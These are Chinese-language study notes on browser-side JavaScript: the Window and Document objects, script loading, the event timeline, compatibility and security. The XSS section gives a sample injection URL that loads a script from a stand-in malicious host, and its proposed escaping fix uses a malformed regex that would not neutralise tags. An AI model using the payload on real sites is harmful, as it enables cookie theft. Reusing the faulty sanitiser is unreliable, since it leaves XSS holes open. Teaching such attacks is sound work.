# `web`浏览器中的`javaScript`

## 客户端`javaScript`

`Window`对象是所有客户端`javaScript`特性和`API`的主要接入点。它表示浏览器的一个窗口或窗体，并且可以使用标识符`window`来引用它。`Window`对象定义了一些属性，方法，构造函数，以及对象。

```javascript

```

注意上面的代码中并没有显式地使用`window`属性。在客户端`javaScript`中，`Widnow`对象也是全局对象。这意味着`Winodw`对象处于作用域链的顶部，它的属性和方法实际上是全局变量和全局函数。`Window`对象由一个引用自身的属性，叫做`window`。如果需要引用窗口对象本身，可以用这个属性，但是如果只是引用全局对象的属性，通常并不需要用到`window`

`Window`对象中其中一个最重要的属性是`document`， 它引用`Document`对象，表示窗口中的文档。`Document`对象中有一些重要的方法，比如`getElementById()`等等，这些方法可以对文档对象进行操作，一些方法可以返回`Element`对象，可以获取其中的属性并且进行设置

`Window`、`Document`、`Element`对象上另一个 重要的属性集合是事件处理程序相关的属性。可以在脚本中为之绑定一个函数，这个函数会在某个事件发生时以异步的方式调用。事件处理程序可以让`javaScript`代码修改窗口、文档和组成文档的元素的行为。事件处理程序的属性名是以单词`on`开始的。

## 在`HTML`里嵌入`javaScript`

在`HTML`文档里嵌入客户端`javaScript`代码有四种方法：

1. 内联，放置在`<script>`和`</script>`标签对之间（少用）
2. 放置在由`<script>`标签的`src`属性指定的外部文件中
3. 放置在`HTML`事件处理程序中，该事件处理程序由`onclick`或`onmouseover`这样的`HTML`属性值指定（少用）
4. 放在一个`URL`里，这个`URL`使用特殊的`javascript:`协议（少用）

### `<script>`元素

`javascript`代码可以以内联的形式出现在`HTML`文件里的`<script>`和`</script>`标签之间

```html
<script>
    // javascript code
</script>
```

### 外部文件中的脚本

`<script>`标签支持`src`属性，这个属性指定包含`javaScript`代码的文件的`URL`

```html
<script src="../../scripts/util.js"></script>
```

以下是`src`属性方式的一些优点：

- `javasrcipt`与`html`分离，有助于保持内容和行为的分离，从而简化`HTML`文件
- 如果多个`web`页面共用相同的`javascript`代码，使用`src`属性可以使其只管理一份代码，而不用修改每一份文件
- 如果一个`javascript`代码文件由多个页面共享，那么它就只需要下载一次，减少了浏览器请求
- 由于`src`属性的只可以是任意的`URL`，因此来自一个`web`服务器的`javascript`程序或者页面可以使用另一个服务器输出的代码（**跨域**）

### 脚本类型

`javascript`是`web`的原始脚本语言，可以在`<script>`元素中使用`type`属性指定脚本的`MIME`类型

```html
<script type="text/vbscript">
    // vbscript 代码， 只有 IE 支持
</script>
```

当`Web`浏览器遇到`<script>`元素，并且这个`<script>`元素包含其值不被浏览器识别的`type`属性时，它会解析这个元素但不会尝试显示或执行它的内容。着意味着可以使用`<script>`元素来嵌入任意的文本数据到文档里

### `HTML`中的事件处理程序

`HTML`中定义的事件处理程序的属性可以包含任意条`javascript`语句，相互之间用逗号分隔。这些语句组成一个函数体，然后这个函数成为对应事件处理程序属性的值，但是常用方法是指定回调函数名称，这样可以做到文档与脚本分离

### `URL`中的`javaScript`

在`URL`后面跟一个`javascript:`协议限定符，是另一种嵌入`javaScript`代码到客户端的方式。这种特殊的协议类型指定`URL`内容为任意字符串，这个字符串会被`javascript`解释器运行的`javascript`代码。

`javascript: URL`可以用在可以使用常规`URL`的任意地方，比如`<a>`标记的`href`属性，`<from>`的`action`属性，或者`window.open()`方法的参数

```html
<a href="javascript:new Date().toLocaleTimeString();"></a>
```

部分浏览器会执行`URL`里面的代码，并使用返回的字符串作为待显示新文档的内容。其他浏览器不允许`URL`像上面一样覆盖当前文档，它们会忽略代码的返回值。如果要确保`javascript:URL`不会覆盖当前文档，可以使用`void`操作符强制函数调用或者表达式赋予`undefined`值

```html
<a href="javascript: void window.open('about:blank')"></a>
```

可以使用`void`操作符来是`a`不进行页面跳转

## `javaScript`程序的执行

客户端`javaScript`程序没有严格的定义。可以说`javaScript`程序是由`Web`页面中所包含的所有`javaScript`代码（内联脚本、`HTML`事件处理事件和`javascript: URL`）和通过`<script>`标签中的`src`属性引用的外部`javascript`代码组成。所有这些单独的代码共用同一个全局对象`window`对象，也可以找到相同的`document`对象，可以共享相同的全局函数和变量的集合：如果一个脚本定义了新的全局变量和函数，那么这个变量或函数会在脚本执行之后对任意`javascript`代码可见

如果`web`页面包含一个嵌入的窗体（通常为`<iframe>`元素），不同的窗体之间的`javascript`会有不同的全局对象，它可以当作一个单独的`javascript`程序。但是，没有严格的关于`javascript`程序范围的定义。如果外面和里面的文档来自于同一个服务器，那么两个文档中的代码就可以进行交互。

`javascript`程序执行有两个阶段

1. 第一个阶段：载入文档内容，并且执行`<script>`元素中的代码（包括内联脚本与外部脚本）。脚本通常会按照它们在文档中的执行顺序执行。所有脚本里的`js`代码都是从上往下，按照它在条件、循环以及其他控制语句中的出现顺序进行执行

2. 第二阶段（文档载入完成并且脚本执行完成后进入）：由事件驱动的异步阶段，在事件驱动阶段，浏览器调用事件处理程序函数来响应异步发生的事件

   事件驱动阶段里第一个事件是`load`事件，指示文档已经完全载入，并且可以操作。

核心`javascript`和客户端`javascript`都有一个单线程执行模型。脚本和事件处理程序在同一个时间只能执行一个，没有并发性

### 同步、异步和延迟的脚本

当`HTML`解析器遇到`<script>`元素的时候，会默认先执行脚本，然后再恢复文档的解析和渲染，这对于内联脚本没有问题，但是如果脚本源代码是一个由`src`属性指定的外部文件，这意味着脚本后面的文档在下载和执行脚本之前，都不会出现在浏览器（指文档的文本内容已经载入，但是并未被浏览器引擎解析为`DOM`树，而`DOM`树的生成是受`javascript`代码执行而影响的，`js`代码会阻塞页面的渲染）。

脚本的执行在默认情况下是同步和阻塞的。`<script>`标签可以有`defer`和`async`属性，该属性需要与`src`属性联合使用。`defer`和`async`属性都像在告诉浏览器链接进来的脚本不会使用`document.write()`，也不会生成文档内容，因此浏览器可以在下载脚本的时候继续解析和渲染文档。

`defer`属性使浏览器延迟脚本的执行，直到文档载入和解析完成。`async`会使浏览器尽快地执行脚本，而不用在下载脚本时阻塞文档的解析。

### 事件驱动的`javaScript`

事件都有名字，比如`click`、`change`、`load`、`mouseover`等等，指示发生的事件的通用类型。事件还有目标，它是一个对象，并且事件就是在它的上面发生的。

注册事件处理程序方法：

1. 在 `HTML`中设置属性
2. 获取节点并设置`onclick` -> `document.getElementById('button').onclick = function () {}`
3. 通过`addEventListener`进行设置（允许注册多个监听器）

事件处理程序在注册时不会进行函数的调用：只是把函数本身赋值给这些属性。浏览器会在事件发生时执行调用。

在大部分的浏览器中，会把一个**对象**（`event`）传递给事件处理程序作为参数，这个对象提供了事件的详细信息。事件处理程序的返回值有时用来指示函数是否充分处理了事件，以及阻止浏览器执行它默认会进行的各种操作。在某一个元素上的事件会向上传递给文档树，一直向上冒泡，并触发上级节点相应事件的事件处理程序。

使用`window.addEventListener`可以注册多个监听器

在`js`程序中还使用异步通知类型，这些类型往往不是事件，比如`onerror`、`setTimtout`、`setInterval`等等，这些会在指定的一段时间之后触发指定函数的调用

### 客户端`javascript`线程模型
`javascript`的语言核心不包含线程机制，并且客户端上也没有定义任何线程机制，单线程执行是为了让编程更加简单，编写代码时可以确保两个事件处理程序不会同一时刻运行，操作文档内容时也不会担心有其他线程同时修改文档，并且永远不需要在写`javascript`代码时担心锁、死锁和竞态条件

单线程执行意味着浏览器必须在脚本和事件处理程序执行的时候停止响应用户输入。如果一个脚本执行计算密集的任务，它将会给文档载入带来延迟，而用户无法在脚本完成前看到文档内容。如果事件处理程序执行计算密集的任务，浏览器可能变得无法响应，可能会导致用户认为浏览器崩溃

如果应用程序不得不执行太多的计算而导致明显的延迟，应该允许文档在执行这个计算之前完全载入，并确保能够告知用户计算正在进行并且浏览器没有挂起。如果可能将计算分解为离散的子任务，可以使用`setTimeout()`和`setInterval()`方法在后台运行子任务，同时更新一个进度指示器向用户显示反馈

`HTML5`定义了一种并发的控制方式，叫做`Web worker`，`web worker`是一个用来执行计算密集任务而不冻结用户界面的后台线程，运行在`web worker`线程里的代码不能访问文档内容，不能和主线程或其他`worker`共享状态，只可以和主线程和其他`worker`通过异步事件进行通信，所以主线程不能检测并发性，并且`web worker`不能修改`javascript`程序的基础单线程执行模型

### 客户端`javascript`时间线
下面是`javascript`程序执行的时间线
1. `web`浏览器创建`Document`对象，并且开始解析`Web`页面，解析`HTML`元素和其文本内容。解析完成之后将其`Element`对象和`Text`节点添加到文档中。在这个阶段`docuemtn.readyState`的值为`loading`

2. 当`HTML`解析器遇到没有`async`和`defer`属性的`<script>`元素时，会把这些元素添加到文档中，然后执行元素内部或者引用的外部脚本，这些脚本是同步执行的，并且在脚本下载以及执行期间`HTML`解析器会暂停。

3. 当解析器遇到设置了`async`属性的`<script>`元素时，开始下载脚本，并且继续执行文档。脚本会在它下载完成后尽快执行，但解析器没有停下等脚本下载。下载脚本执行时可以访问它执行之前的所有文档元素，但是不能访问其他文档内容

4. 当文档解析完成，`document.readyState`属性变为`interactive`

5. 有`defer`属性的脚本，会按照它们在文档里面出现顺序执行，异步脚本也可能会在这个时间执行。延迟脚本可以访问完整的文档树

6. 浏览器在`Document`对象上触发`DOMContentLoaded`事件，程序从同步脚本执行阶段转为异步事件驱动阶段，但这时可能还有异步脚本没有执行完成

7. 文档完全解析完成，浏览器等待其他内容载入，如图片等等。当所有的内容载入完成，并且异步脚本完成载入和执行，`document.readyState`属性变为`complete`,`web`浏览器触发`Window`对象上的`load`事件

8. 调用异步事件，以异步响应用户的交互事件

上面的时间线并不是所有的浏览器都支持，但是所有的浏览器普遍都支持`load`事件，都会触发它，它是决定文档完全载入并可以操作的最通用的技术

## 兼容性和互用性
由于不同的浏览器厂商对浏览器中的支持不同，所有就需要进行兼容

### 处理兼容性问题的类库
处理不兼容问题其中一个最简单的方式就是使用类库，比如`excanvas.js`、`jQuery`等等

### 分级浏览器支持
从某种维度对浏览器厂商/版本/操作系统变体进行分级，不同的等级满足不同的功能即可

### 功能测试
功能测试是解决不兼容问题的一种强大的技术。如果你想使用某个功能，但是又不清楚这个功能是否在所有的浏览器中都有比较好的兼容性，则需要在脚本添加相应的代码来检测是否在浏览器中支持该功能。比如检测是否支持`addEventListener`
```javascript
if (element.addEventListener) {
    element.addEventListener('keydown', handler, false)
} else if (element.attachEvent) {
    element.attachEvent('onkeydown', handler)
} else {
    element.onkeydown = handler
}
```

### 怪异模式和标准模式
微软在发布`IE6`的时候，增加了`IE5`里很多没有的`CSS`标准特性，但是为了确保与已有的`Web`内容向后兼容，它定义了两种不同的渲染模式，在“标准模式”或“`css`兼容模式”中，浏览器要遵守`css`标准，在“怪异模式”中，浏览器表现的和`IE4/5`中的怪异非标准模式一样。

渲染模式的选择依赖于`HTML`文件顶部的`DOCTYPE`声明，在`IE6`中打开了没有`DOCTYPE`的页面和声明了某些权限`DOCTYPE`的页面都会按照怪异模式进行渲染，定义了严格的`DOCTYPE`页面会按照标准模式进行渲染，定义了`HTML 5 Doctype`(`<!DOCTYPE html>`)的页面在所有现代浏览器中都会按照标准模式进行渲染

现在浏览器都支持标准模式，如果需要进行渲染模式的特性检测，通常检查`document.compatMode`属性，其值为`CSS1Compat`时，则说明浏览器工作在标准模式，如果值为`BackCompat`或者为`undefined`，则说明浏览器工作在怪异模式

### 浏览器测试
有时候需要对浏览器进行检测，来解决特定浏览器下的问题，这个时候就需要进行浏览器检测。在客户端`javascript`中检测浏览器类型和版本的方法就是使用`Navigator`对象。需要注意的是，浏览器检测也可以在服务端完成，`web`服务器可以根据`User-Agent`头部来选择地返回特定的`javascript`代码给客户端

### `Internet Explorer`里的条件注释
客户端中的需要兼容性代码都是针对`IE`浏览器的，也就是说，必须按照某一种方式为`IE`编码，而按照另一种格式来为其他的浏览器编写代码

下面是在`HTML`中的条件注释
```html
<!--[if IE 6]>
this conten can be displayed in IE6
<![endif]-->
<!--[if lte IE 7]>
this conten can be displayed in IE7
<![endif]-->
<!--[if !IE]><-->
this conten can be displayed in IE7
<!--><![endif]-->
<!-- 在IE 浏览器中加载特定包 -->
<!--[if IE]>
<script src="excanvas.js"></script>
<![endif]-->
```
下面是在`javascript`中的条件注释
```javascript
/*@cc_on
  @if (@_jscript)
    // 改代码位于一条js注释内，会在IE中执行
    alert('in IE')
  @end
  @*/
```

## 可访问性
需要确保那些有视觉障碍或者肢体困难的用户正确地获取信息。为了确保不同的用户能够正确获取并且使用网页应该尽量：
1. 设计的代码即使在禁用`javascript`解释器的浏览器中也能正常使用

2. 浏览器允许使用键盘来遍历和激活一个页面中的所有`UI`元素，应该多使用独立于设备的事件如`onfocus`、`onchange`等

## 安全性

### `javascript`不能做什么
`web`浏览器针对恶意代码的第一个防线就是不支持某些功能，具体的功能见《`javascript`权威指南》`page 335`

### 同源策略
同源策略是对`javascript`代码能够操作哪些`web`内容的一条完整的完全限制，脚本只能读取和所属文档来源相同的窗口和文档的属性。文档的来源包含协议，主机以及端口号，其中的一个不同，都为不同的来源。

***不严格的同源策略***
在某些情况下，同源策略显得就过于严格，下面是几种不严格的同源策略
1. 将两个窗口（或窗体）包含的脚本的`domain`属性设置为相同的值，这两个窗口就不受同源策略限制。例如，从`order.example.com`和`catalog.example.com`载入的文档中的脚本可以将它们的`document.domain`设置为`example.com`，这样就可以互相访问

2. 跨域资源共享([`Cross-Origin Resource Sharing`](https://www.w3.org/TR/cors/))，这样就可以使用新的`origin`请求头和`Access-Control-Allow-Origin`响应头来扩展`HTTP`,它允许服务器用头信息显式地列出源或者使用通配符来匹配所有的源并允许由任何地址请求文件

3. 跨文档消息，允许来自一个文档的脚本可以传递文本信息到另一个脚本，而不管脚本的来源是否不同。调用`window`对象上的`postMessage()`方法，可以异步传递消息事件（可以使用`onmessage`来处理）到窗口的文档里。一个文档里的脚本还是不能调用其他文档里的方法和读取里面的属性，但是可以使用这种消息传递技术来实现安全通信

### 跨站脚本
由于`script`标签可以引入其他服务器的脚本并运行，所以就会产生跨站脚本(`Cross-site Script`)，也就是`XSS`攻击，`XSS`攻击表示一类安全问题，也就是攻击者向目标`Web`站点注入`HTML`标签或者脚本

如果一个页面地址为`http://www.example.com/greet.html?David`，然后在脚本中可以通过地址获取信息并动态生成脚本，如下代码:
```javascript
var name = decodeURIComponent(window.location.search.substring(1) || '')
document.write("hello" +　name)
```
执行后会页面会显示`hello David`，但是如果使用`http://www.example.com/greet.html?name=%3Cscript src=http://siteB.evil.js%3E%3C/script%3E`, 就会注入一个来自站点`B`的脚本，这个脚本可以对站点中的内容进行任何想要的操作，还可能可以读取站点中的所有存储的`cookie`等

一般情况下，防止`XSS`攻击的方式就是在任何不可信的数据来动态的创建文档内容之前，从中移除`HTML`标签，比如`name = name.replace(/<g/, "&lt;").replace(/>g/, "&gt;")`

### 拒绝服务攻击
访问启用`javascript`功能的一个恶意`web`站点，这个站点可以使用一个`alert()`对话框来无限循环占用浏览器，或者使用一个无限循环或没有意义的计算来占用`CPU`，这种对服务的攻击非常的暴力，但是实际上，由于没有人会返回一个滥用这种脚本的网站，因此这个在`web`上不是一个常见的问题
